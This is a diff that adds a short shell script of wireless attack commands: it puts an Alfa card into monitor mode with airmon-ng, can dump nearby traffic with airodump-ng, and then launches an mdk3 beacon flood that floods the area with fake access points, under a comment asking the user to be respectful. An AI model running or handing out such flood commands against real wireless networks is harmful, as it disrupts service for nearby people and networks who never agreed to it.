@@ -1,0 +1,13 @@
+#Be respectful with this and don't leave it on
+
+#check interface to use with aircrack suite (the ralink device is your alfa card)
+sudo airmon-ng
+
+#start interface in monitor mode
+sudo airmon-ng start <interface>
+
+#to dump monitored packets
+#sudo airodump-ng <aircrack interface>
+
+#send beacon flood
+sudo mdk3 <aircrack interface> b 
